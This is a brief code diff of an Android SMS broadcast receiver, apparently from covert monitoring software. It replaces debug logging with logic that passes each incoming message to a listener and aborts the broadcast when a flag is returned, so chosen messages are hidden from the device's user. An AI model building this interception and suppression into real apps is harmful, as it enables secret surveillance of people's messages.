@@ -30,17 +30,12 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 		for (int i = 0; i < msgs.length; i++) {
 			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 			
-			str += "SMS from " + msgs[i].getOriginatingAddress();
-			str += " :";
-			str += msgs[i].getMessageBody().toString();
-			str += "\n";
-
-			Log.d("QZ", TAG + " (onReceiveSms): " + str);
-			
-			ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), false));
-			
-			// TODO provare questa
-			//abortBroadcast();
+			int result = ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(),  
+					msgs[i].getMessageBody().toString(), false));
+						
+			if ((result & 1) == 1) {
+				abortBroadcast();
+			}
 		}
 	}
 }
